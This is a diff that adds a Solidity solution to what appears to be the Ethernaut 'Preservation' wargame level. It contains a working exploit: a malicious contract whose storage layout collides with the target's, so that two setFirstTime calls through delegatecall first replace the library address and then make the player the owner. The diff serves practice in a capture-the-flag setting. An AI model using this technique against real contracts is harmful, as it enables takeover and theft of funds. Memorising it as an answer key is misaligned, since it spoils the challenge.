@@ -17,5 +17,19 @@ contract PreservationLevel is SetUpLevelTest {
         preservation = Preservation(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        address preAttack = address(new PreservationAttack());
+        preservation.setFirstTime(uint256(uint160(preAttack))); // set timeZone1Library to our malicious contract
+        preservation.setFirstTime(uint256(uint160(player)));
+        vm.stopPrank();
+    }
+}
+
+contract PreservationAttack {
+    uint256[2] __gap;
+    address owner;
+
+    function setTime(uint256 _newOwner) public {
+        owner = address(uint160(_newOwner));
     }
 }
